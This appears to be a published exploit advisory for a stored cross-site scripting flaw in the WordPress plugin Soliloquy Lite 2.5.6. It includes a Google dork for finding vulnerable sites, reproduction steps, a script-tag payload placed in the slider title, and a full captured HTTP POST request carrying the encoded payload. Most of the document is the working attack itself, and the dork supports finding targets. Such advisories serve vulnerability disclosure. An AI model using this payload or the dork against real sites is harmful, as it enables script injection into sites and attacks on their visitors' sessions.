@@ -1,0 +1,44 @@
+# Exploit Title: Wordpress Soliloquy Lite 2.5.6 - Persistent Cross-Site Scripting
+# Google Dork: inurl:"\wp-content\plugins\soliloquy-lite"
+# Date: 2019-06-13
+# Exploit Author: Unk9vvN
+# Vendor Homepage: https://soliloquywp.com/
+# Software Link: https://wordpress.org/plugins/soliloquy-lite/
+# Version: 2.5.6
+# Tested on: Kali Linux
+# CVE: N/A
+
+
+# Description
+# This vulnerability is in the validation mode and is located in the Prevew of new post inside soliloquy and the vulnerability type is stored ,it happend when a user insert script tag in title input then save the post. everything will be ok until target click on preview of vulnerabil.
+
+1.Go to the 'Add new' section of soliloquy
+2.Enter the payload in the "add Title"
+3.Select a sample image
+4.Click the "Publish" option
+5.Click on Preview
+6.Your payload will run
+
+
+# URI: http://localhost/wordpress/wp-admin/post.php?post=50&action=edit
+# Parameter & Payoad: post_title=&#47;"><script>alert("Unk9vvN")<&#47;script>
+
+
+#
+# POC
+#
+POST /wordpress/wp-admin/post.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wordpress/wp-admin/post.php?post=50&action=edit
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1599
+Cookie: .......
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+_wpnonce=d9f78b76e2&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D50%26action%3Dedit%26message%3D6&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=soliloquy&original_post_status=publish&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost-new.php%3Fpost_type%3Dsoliloquy%26wp-post-new-reload%3Dtrue&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost-new.php%3Fpost_type%3Dsoliloquy%26wp-post-new-reload%3Dtrue&post_ID=50&meta-box-order-nonce=5e054a06d1&closedpostboxesnonce=03e898cf80&post_title=%22%2F%3E%3Cscript%3Ealert%28%22Unk9vvN%22%29%3C%2Fscript%3E&samplepermalinknonce=fc4f7ec2ab&_soliloquy%5Btype%5D=default&async-upload=&post_id=50&soliloquy=bdfd10296c&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D50%26action%3Dedit%26message%3D6&_soliloquy%5Btype_default%5D=1&_soliloquy%5Bslider_theme%5D=base&_soliloquy%5Bslider_width%5D=960&_soliloquy%5Bslider_height%5D=300&_soliloquy%5Btransition%5D=fade&_soliloquy%5Bduration%5D=5000&_soliloquy%5Bspeed%5D=400&_soliloquy%5Bgutter%5D=20&_soliloquy%5Bslider%5D=1&_soliloquy%5Baria_live%5D=polite&_soliloquy%5Btitle%5D=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&_soliloquy%5Bslug%5D=scriptalert1script&_soliloquy%5Bclasses%5D=&wp-preview=dopreview&hidden_post_status=publish&post_status=publish&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=09&jj=13&aa=2019&hh=15&mn=21&ss=21&hidden_mm=09&cur_mm=09&hidden_jj=13&cur_jj=13&hidden_aa=2019&cur_aa=2019&hidden_hh=15&cur_hh=15&hidden_mn=21&cur_mn=21&original_publish=Update
